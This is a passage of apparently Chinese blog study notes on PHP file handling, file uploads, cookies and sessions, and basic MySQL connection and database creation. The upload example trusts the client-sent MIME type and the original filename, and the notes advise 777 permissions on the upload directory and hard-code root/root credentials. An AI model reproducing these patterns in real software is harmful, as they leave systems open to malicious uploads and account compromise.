<td align="left">x+</td>
<td align="left">读&#x2F;写。创建新文件。如果文件已存在，则返回 FALSE 和一个错误。</td>
</tr>
</tbody></table>
<p>如果 fopen() 函数无法打开指定文件，则返回 0 (false)，可通过下例生成一段消息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file=fopen(&quot;welcome.txt&quot;,&quot;r&quot;) or exit(&quot;Unable to open file!&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="关闭文件"><a href="#关闭文件" class="headerlink" title="关闭文件"></a>关闭文件</h4><p>fclose() 函数用于关闭打开的文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = fopen(&quot;test.txt&quot;,&quot;r&quot;);</span><br><span class="line">//执行一些代码</span><br><span class="line">fclose($file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="检测文件末尾（EOF）"><a href="#检测文件末尾（EOF）" class="headerlink" title="检测文件末尾（EOF）"></a>检测文件末尾（EOF）</h4><p>feof() 函数检测是否已到达文件末尾（EOF）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (feof($file)) echo &quot;文件结尾&quot;;</span><br></pre></td></tr></table></figure>

<p>在 w 、a 和 x 模式下，无法读取打开的文件</p>
<h4 id="逐行读取文件"><a href="#逐行读取文件" class="headerlink" title="逐行读取文件"></a>逐行读取文件</h4><p>fgets() 函数用于从文件中逐行读取文件，在调用该函数之后，文件指针会移动到下一行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = fopen(&quot;welcome.txt&quot;, &quot;r&quot;) or exit(&quot;无法打开文件!&quot;);</span><br><span class="line">// 读取文件每一行，直到文件结尾</span><br><span class="line">while(!feof($file))</span><br><span class="line">&#123;</span><br><span class="line">    echo fgets($file). &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">fclose($file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="逐字符读取文件"><a href="#逐字符读取文件" class="headerlink" title="逐字符读取文件"></a>逐字符读取文件</h4><p>fgetc() 函数用于从文件中逐字符地读取文件，在调用该函数之后，文件指针会移动到下一个字符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file=fopen(&quot;welcome.txt&quot;,&quot;r&quot;) or exit(&quot;无法打开文件!&quot;);</span><br><span class="line">while (!feof($file))</span><br><span class="line">&#123;</span><br><span class="line">    echo fgetc($file);</span><br><span class="line">&#125;</span><br><span class="line">fclose($file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="PHP-文件上传"><a href="#PHP-文件上传" class="headerlink" title="PHP 文件上传"></a>PHP 文件上传</h3><h4 id="创建一个文件上传表单"><a href="#创建一个文件上传表单" class="headerlink" title="创建一个文件上传表单"></a>创建一个文件上传表单</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=&quot;upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>[!IMPORTANT]</p>
<h4 id="enctype"><a href="#enctype" class="headerlink" title="enctype"></a>enctype</h4><p>在 HTML 表单中，<code>enctype</code> 属性用于指定表单数据在发送到服务器时的编码类型。这个属性主要在使用 <code>POST</code> 方法时生效，决定了表单中数据如何被格式化。下面是常用的enctype值：</p>
<table>
<thead>
<tr>
<th>值</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>application/x-www-form-urlencoded</code></td>
<td>默认值。表单数据会被编码为键值对（键和值通过 <code>=</code> 连接，不同键值对通过 <code>&amp;</code> 连接）<strong>以 URL 编码的形式发送到服务器</strong>。适用于普通表单（比如文本输入）</td>
</tr>
<tr>
<td><code>multipart/form-data</code></td>
<td>用于<strong>上传文件</strong>时。数据会以分段形式进行编码，每段包含一个表单控件的数据。<strong>必须在表单中使用 <code>method=&quot;post&quot;</code> 和 <code>enctype=&quot;multipart/form-data&quot;</code> 才能上传文件</strong></td>
</tr>
<tr>
<td><code>text/plain</code></td>
<td>表单数据以纯文本形式进行编码（键值对以 <code>=</code> 连接，不同键值对通过换行符分隔）<strong>不会对特殊字符进行编码</strong></td>
</tr>
</tbody></table>
</blockquote>
<p><code>&lt;input&gt;</code> 标签的 <strong>type&#x3D;”file”</strong> 属性规定了应该把输入作为文件来处理。举例来说，当在浏览器中预览时，会看到输入框旁边有一个浏览按钮。</p>
<h4 id="创建上传脚本"><a href="#创建上传脚本" class="headerlink" title="创建上传脚本"></a>创建上传脚本</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;错误：&quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;上传文件名: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;文件类型: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;文件大小: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; kB&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;文件临时存储的位置: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>通过使用 PHP 的<strong>全局数组 $_FILES</strong>，可以从<strong>客户计算机向远程服务器上传文件</strong></p>
<blockquote>
<p>[!IMPORTANT]</p>
<h4 id="FILES"><a href="#FILES" class="headerlink" title="$_FILES"></a>$_FILES</h4><p>第一个参数是表单的 input name，第二个下标可以是 “name”、”type”、”size”、”tmp_name” 或 “error”</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>说明</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>$_FILES[&#39;file&#39;][&#39;name&#39;]</code></td>
<td>上传文件的原始名称（包括扩展名）</td>
<td><code>example.jpg</code></td>
</tr>
<tr>
<td><code>$_FILES[&#39;file&#39;][&#39;type&#39;]</code></td>
<td>上传文件的 MIME 类型（例如 <code>image/jpeg</code>，<code>text/plain</code>）</td>
<td><code>image/jpeg</code></td>
</tr>
<tr>
<td><code>$_FILES[&#39;file&#39;][&#39;size&#39;]</code></td>
<td>上传文件的大小，以字节为单位</td>
<td><code>102400</code> (100 KB)</td>
</tr>
<tr>
<td><code>$_FILES[&#39;file&#39;][&#39;tmp_name&#39;]</code></td>
<td>文件上传后存储在服务器上的临时文件名</td>
<td>&#x2F;<code>tmp/phpY9k1b9</code></td>
</tr>
<tr>
<td><code>$_FILES[&#39;file&#39;][&#39;error&#39;]</code></td>
<td>上传过程中发生的错误代码</td>
<td><code>UPLOAD_ERR_OK</code> (0)</td>
</tr>
</tbody></table>
<h5 id="常见的error错误代码"><a href="#常见的error错误代码" class="headerlink" title="常见的error错误代码"></a>常见的error错误代码</h5><table>
<thead>
<tr>
<th>错误代码</th>
<th>说明</th>
<th>错误数字</th>
</tr>
</thead>
<tbody><tr>
<td><code>UPLOAD_ERR_OK</code></td>
<td>文件上传成功</td>
<td>0</td>
</tr>
<tr>
<td><code>UPLOAD_ERR_INI_SIZE</code></td>
<td>上传的文件超过了 PHP 配置文件 <code>upload_max_filesize</code> 的限制</td>
<td>1</td>
</tr>
<tr>
<td><code>UPLOAD_ERR_FORM_SIZE</code></td>
<td>上传的文件超过了 HTML 表单设置的 <code>MAX_FILE_SIZE</code> 的限制</td>
<td>2</td>
</tr>
<tr>
<td><code>UPLOAD_ERR_PARTIAL</code></td>
<td>文件部分上传（可能由于网络中断等原因）</td>
<td>3</td>
</tr>
<tr>
<td><code>UPLOAD_ERR_NO_FILE</code></td>
<td>没有文件被上传</td>
<td>4</td>
</tr>
<tr>
<td><code>UPLOAD_ERR_NO_TMP_DIR</code></td>
<td>PHP 缺少临时文件夹</td>
<td>6</td>
</tr>
<tr>
<td><code>UPLOAD_ERR_CANT_WRITE</code></td>
<td>PHP 无法写入文件到磁盘</td>
<td>7</td>
</tr>
<tr>
<td><code>UPLOAD_ERR_EXTENSION</code></td>
<td>上传被 PHP 扩展程序阻止</td>
<td>8</td>
</tr>
</tbody></table>
</blockquote>
<h4 id="上传限制"><a href="#上传限制" class="headerlink" title="上传限制"></a>上传限制</h4><p>限制文件上传的格式（如.gif、.png）及上传文件的大小</p>
<h4 id="保存被上传的文件"><a href="#保存被上传的文件" class="headerlink" title="保存被上传的文件"></a>保存被上传的文件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 允许上传的图片后缀</span><br><span class="line">$allowedExts = array(&quot;gif&quot;, &quot;jpeg&quot;, &quot;jpg&quot;, &quot;png&quot;);</span><br><span class="line">$temp = explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;]);</span><br><span class="line">echo $_FILES[&quot;file&quot;][&quot;size&quot;];</span><br><span class="line">$extension = end($temp);     // 获取文件后缀名</span><br><span class="line">if ((($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/gif&quot;)</span><br><span class="line">|| ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;)</span><br><span class="line">|| ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpg&quot;)</span><br><span class="line">|| ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/pjpeg&quot;)</span><br><span class="line">|| ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/x-png&quot;)</span><br><span class="line">|| ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/png&quot;))</span><br><span class="line">&amp;&amp; ($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 204800)   // 小于 200 kb</span><br><span class="line">&amp;&amp; in_array($extension, $allowedExts))</span><br><span class="line">&#123;</span><br><span class="line">    if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;错误：: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;上传文件名: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo &quot;文件类型: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo &quot;文件大小: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; kB&lt;br&gt;&quot;;</span><br><span class="line">        echo &quot;文件临时存储的位置: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">        </span><br><span class="line">        // 判断当前目录下的 upload 目录是否存在该文件</span><br><span class="line">        // 如果没有 upload 目录，你需要创建它，upload 目录权限为 777</span><br><span class="line">        if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))</span><br><span class="line">        &#123;</span><br><span class="line">            echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; 文件已经存在。 &quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            // 如果 upload 目录不存在该文件则将文件上传到 upload 目录下</span><br><span class="line">            move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]);</span><br><span class="line">            echo &quot;文件存储在: &quot; . &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;非法的文件格式&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>[!IMPORTANT]</p>
<h4 id="in-array-extension-allowedExts"><a href="#in-array-extension-allowedExts" class="headerlink" title="in_array($extension, $allowedExts)"></a><code>in_array($extension, $allowedExts)</code></h4><p>用于检查文件扩展名是否在允许的扩展名列表中</p>
<p><code>$extension</code>，即文件扩展名，<code>$allowedExts</code>，即允许的扩展名列表</p>
</blockquote>
<h3 id="PHP-Cookie"><a href="#PHP-Cookie" class="headerlink" title="PHP Cookie"></a>PHP Cookie</h3><p>cookie 常用于识别用户</p>
<p>cookie 是一种服务器留在用户计算机上的小文件。每当同一台计算机通过浏览器请求页面时，这台计算机将会发送 cookie</p>
<h4 id="创建Cookie"><a href="#创建Cookie" class="headerlink" title="创建Cookie"></a>创建Cookie</h4><p> setcookie() 函数用于设置 cookie，setcookie() 函数必须位于 <code>&lt;html&gt;</code> 标签之前</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setcookie(name, value, expire, path, domain);</span><br></pre></td></tr></table></figure>

<h5 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h5><p>创建名为 “user” 的 cookie，并为它赋值 “runoob”，规定了此 cookie 在一小时后过期</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">setcookie(&quot;user&quot;, &quot;runoob&quot;, time()+3600);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">.....</span><br></pre></td></tr></table></figure>

<blockquote>
<p>[!CAUTION]</p>
<p>在发送 cookie 时，cookie 的值会自动进行 URL 编码，在取回时进行自动解码（为防止 URL 编码，请使用 <code>setrawcookie()</code> 取而代之）</p>
</blockquote>
<blockquote>
<p>[!TIP]</p>
<p>可以通过另一种方式设置 cookie 的过期时间（比使用秒表示的方法简单）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$expire=time()+60*60*24*30;</span><br><span class="line">setcookie(&quot;user&quot;, &quot;runoob&quot;, $expire);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>在上面的实例中，过期时间被设置为一个月（<em>60 秒 * 60 分 * 24 小时 * 30 天</em>）</p>
</blockquote>
<h4 id="取回Cookie的值"><a href="#取回Cookie的值" class="headerlink" title="取回Cookie的值"></a>取回Cookie的值</h4><p>PHP 的 <code>$_COOKIE</code> 变量用于取回 cookie 的值</p>
<p>在下面的实例中，我们取回了名为 “user” 的 cookie 的值，并把它显示在了页面上：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 输出 cookie 值</span><br><span class="line">echo $_COOKIE[&quot;user&quot;];</span><br><span class="line"></span><br><span class="line">// 查看所有 cookie</span><br><span class="line">print_r($_COOKIE);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>在下面的实例中，我们使用 isset() 函数来确认是否已设置了 cookie：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_COOKIE[&quot;user&quot;]))</span><br><span class="line">    echo &quot;欢迎 &quot; . $_COOKIE[&quot;user&quot;] . &quot;!&lt;br&gt;&quot;;</span><br><span class="line">else</span><br><span class="line">    echo &quot;普通访客!&lt;br&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="删除Cookie"><a href="#删除Cookie" class="headerlink" title="删除Cookie"></a>删除Cookie</h4><p>当删除 cookie 时，应当使过期日期变更为过去的时间点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 设置 cookie 过期时间为过去 1 小时</span><br><span class="line">setcookie(&quot;user&quot;, &quot;&quot;, time()-3600);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="浏览器不支持Cookie"><a href="#浏览器不支持Cookie" class="headerlink" title="浏览器不支持Cookie"></a>浏览器不支持Cookie</h4><p>一种解决方式是通过表单传递数据</p>
<h3 id="PHP-Session"><a href="#PHP-Session" class="headerlink" title="PHP Session"></a>PHP Session</h3><p>PHP session 变量用于<strong>存储关于用户会话（session）的信息</strong>，或者<strong>更改用户会话（session）的设置</strong>。Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的</p>
<p>与 Cookie 不同，Session 的数据存储在<strong>服务器</strong>上</p>
<p>Session 的工作机制是：为每个访客创建一个<strong>唯一</strong>的 id (UID)，并基于这个 UID 来存储变量。UID 存储在 cookie 中，或者通过 URL 进行传导。</p>
<h4 id="开始PHP-Session"><a href="#开始PHP-Session" class="headerlink" title="开始PHP Session"></a>开始PHP Session</h4><p>把用户信息存储到 PHP session 中之前，首先必须启动会话。</p>
<p>注：session_start() 函数必须位于 <code>&lt;html&gt;</code> 标签之前：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php session_start(); ?&gt;</span><br><span class="line"> </span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"> </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>上面的代码会向服务器注册用户的会话，以便可以开始保存用户信息，同时会为用户会话分配一个 UID</p>
<h4 id="存储和读取-Session-数据"><a href="#存储和读取-Session-数据" class="headerlink" title="存储和读取 Session 数据"></a>存储和读取 Session 数据</h4><p>使用 PHP $_SESSION 变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">// 读取 Session 数据</span><br><span class="line">if (isset($_SESSION[&#x27;username&#x27;])) &#123;</span><br><span class="line">    echo &quot;用户名: &quot; . $_SESSION[&#x27;username&#x27;]; // 输出: 用户名: Alice</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;用户名未设置。&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="销毁Session"><a href="#销毁Session" class="headerlink" title="销毁Session"></a>销毁Session</h4><p>可以使用 unset() 或 session_destroy() 函数删除某些 session 数据</p>
<h5 id="unset"><a href="#unset" class="headerlink" title="unset()"></a>unset()</h5><p>删除 <code>$_SESSION</code> 里的指定数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if(isset($_SESSION[&#x27;views&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    unset($_SESSION[&#x27;views&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="session-unset"><a href="#session-unset" class="headerlink" title="session_unset()"></a>session_unset()</h5><p>清空所有会话数据但保留会话本身（即不会删除 Session ID 或终止会话）</p>
<h5 id="session-destroy"><a href="#session-destroy" class="headerlink" title="session_destroy()"></a>session_destroy()</h5><p>终止会话并删除服务器端的会话数据（如存储在 <code>$_SESSION</code> 中的所有数据）然而，<strong>它不会立即清空 <code>$_SESSION</code> 数组中的数据</strong>，也不会删除客户端的 Session ID Cookie</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_destroy();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>[!TIP]</p>
<p>如果 <code>session_destroy()</code> 后还需要删除客户端的会话 Cookie</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setcookie(session_name(), &#x27;&#x27;, time() - 3600); // 删除客户端 Cookie</span><br></pre></td></tr></table></figure>


</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start(); // 开启会话</span><br><span class="line"></span><br><span class="line">// 清空所有 Session 数据</span><br><span class="line">session_unset();</span><br><span class="line"></span><br><span class="line">// 销毁会话</span><br><span class="line">session_destroy();</span><br><span class="line"></span><br><span class="line">// 删除客户端的 Session ID Cookie</span><br><span class="line">if (ini_get(&quot;session.use_cookies&quot;)) &#123;</span><br><span class="line">    $params = session_get_cookie_params();</span><br><span class="line">    setcookie(session_name(), &#x27;&#x27;, time() - 3600, </span><br><span class="line">        $params[&quot;path&quot;], $params[&quot;domain&quot;], </span><br><span class="line">        $params[&quot;secure&quot;], $params[&quot;httponly&quot;]</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;会话已销毁，客户端的 Session Cookie 已删除。&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="PHP-数据库"><a href="#PHP-数据库" class="headerlink" title="PHP 数据库"></a>PHP 数据库</h2>]]></content>
      <categories>
        <category>后端</category>
      </categories>
  </entry>
  <entry>
    <title>MySQL</title>
    <url>/2025/02/05/MySQL/</url>
    <content><![CDATA[<h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><p>一个关系型数据库管理系统（RDBMS）</p>
<h2 id="MySQL-注释"><a href="#MySQL-注释" class="headerlink" title="MySQL 注释"></a>MySQL 注释</h2><p><strong>单行注释</strong>（<code>--</code> 和 <code>#</code>）</p>
<p><strong>多行注释</strong>（<code>/* */</code>）</p>
<h2 id="MySQL连接"><a href="#MySQL连接" class="headerlink" title="MySQL连接"></a>MySQL连接</h2><h3 id="使用-MySQL-二进制方式连接"><a href="#使用-MySQL-二进制方式连接" class="headerlink" title="使用 MySQL 二进制方式连接"></a>使用 MySQL 二进制方式连接</h3><ol>
<li><p>win+R  -&gt;  cmd</p>
</li>
<li><p>通过<code>D:</code>切换到D盘（我的mysql安装在D盘）</p>
</li>
<li><p><code>mysql -u root -p</code></p>
</li>
<li><p>按照提示输入密码<code>root</code>（默认），并按下 Enter 键</p>
<p>在登录成功后会出现mysql命令提示窗口，你可以在上面执行任何 SQL 语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 2854760 to server version: 5.0.9</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the buffer.</span><br></pre></td></tr></table></figure>

<p>以上为登录成功输出结果</p>
</li>
<li><p>列出所有可用的数据库：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHOW DATABASES;</span><br></pre></td></tr></table></figure>
</li>
<li><p>选择要使用的数据库：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">USE your_database;</span><br></pre></td></tr></table></figure>
</li>
<li><p>列出所选数据库中的所有表：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHOW TABLES;</span><br></pre></td></tr></table></figure>
</li>
<li><p>退出mysql命令提示窗口：EXIT 或 QUIT</p>
</li>
</ol>
<h3 id="使用-PHP-脚本连接"><a href="#使用-PHP-脚本连接" class="headerlink" title="使用 PHP 脚本连接"></a>使用 PHP 脚本连接</h3><p><code>mysqli_connect()</code> 函数来连接数据库  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqli_connect(host, username, password, dbname,port, socket);</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><em>host</em></td>
<td align="left">可选。规定主机名或 IP 地址。</td>
</tr>
<tr>
<td align="left"><em>username</em></td>
<td align="left">可选。规定 MySQL 用户名。</td>
</tr>
<tr>
<td align="left"><em>password</em></td>
<td align="left">可选。规定 MySQL 密码。</td>
</tr>
<tr>
<td align="left"><em>dbname</em></td>
<td align="left">可选。规定默认使用的数据库。</td>
</tr>
<tr>
<td align="left"><em>port</em></td>
<td align="left">可选。规定尝试连接到 MySQL 服务器的端口号。</td>
</tr>
<tr>
<td align="left"><em>socket</em></td>
<td align="left">可选。规定 socket 或要使用的已命名 pipe。</td>
</tr>
</tbody></table>
<p><code>mysqli_close()</code> 函数来断开与 MySQL 数据库的链接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bool mysqli_close ( mysqli $link )</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;root&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;Could not connect: &#x27; . mysqli_error());</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;数据库连接成功！&#x27;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="MySQL-创建数据库"><a href="#MySQL-创建数据库" class="headerlink" title="MySQL 创建数据库"></a>MySQL 创建数据库</h2><h3 id="使用-create-命令"><a href="#使用-create-命令" class="headerlink" title="使用 create 命令"></a>使用 <strong>create</strong> 命令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE DATABASE 数据库名;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE DATABASE 数据库名 CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>[!CAUTION]</p>
<p>上述例子指定该数据库使用的字符集为 <code>utf8mb4</code>，支持完整的 UTF-8 编码（包括表情符号和其他特殊字符）并设置排序规则为 <code>utf8mb4_general_ci</code>，表示不区分大小写</p>
</blockquote>
<p>为了避免数据库已经存在，执行 CREATE DATABASE 将导致错误：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE DATABASE IF NOT EXISTS 数据库名;</span><br></pre></td></tr></table></figure>

<h3 id="使用-mysqladmin"><a href="#使用-mysqladmin" class="headerlink" title="使用 mysqladmin"></a>使用 mysqladmin</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqladmin -u root -p create 数据库名</span><br></pre></td></tr></table></figure>

<p>如果要在创建数据库时指定字符集和排序规则，可以使用 <code>-default-character-set</code>和 <code>-default-collation</code>参数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqladmin -u root -p create 数据库名 \</span><br><span class="line">  --default-character-set=utf8mb4 \</span><br><span class="line">  --default-collation=utf8mb4_general_ci</span><br></pre></td></tr></table></figure>

<p>如果希望使用 mysqladmin 连接到 MySQL 服务器执行其他管理任务，例如查看服务器状态、重启服务器等，可以使用以下形式的命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqladmin -u your_username -p your_command</span><br><span class="line">//your_command为希望执行的具体管理命令</span><br></pre></td></tr></table></figure>

<p>例如，要查看 MySQL 服务器的状态：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqladmin -u root -p status</span><br></pre></td></tr></table></figure>

<h3 id="使用-PHP脚本"><a href="#使用-PHP脚本" class="headerlink" title="使用 PHP脚本"></a>使用 PHP脚本</h3><p>PHP 使用 <code>mysqli_query</code> 函数来创建或者删除 MySQL 数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqli_query(connection,query,resultmode);</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><em>connection</em></td>
<td align="left">必需。规定要使用的 MySQL 连接。</td>
</tr>
<tr>
<td align="left"><em>query</em></td>
<td align="left">必需，规定查询字符串。</td>
</tr>
<tr>
<td align="left"><em>resultmode</em></td>
<td align="left">可选。一个常量。可以是下列值中的任意一个：MYSQLI_USE_RESULT（如果需要检索大量数据，请使用这个）MYSQLI_STORE_RESULT（默认）</td>
</tr>
</tbody></table>
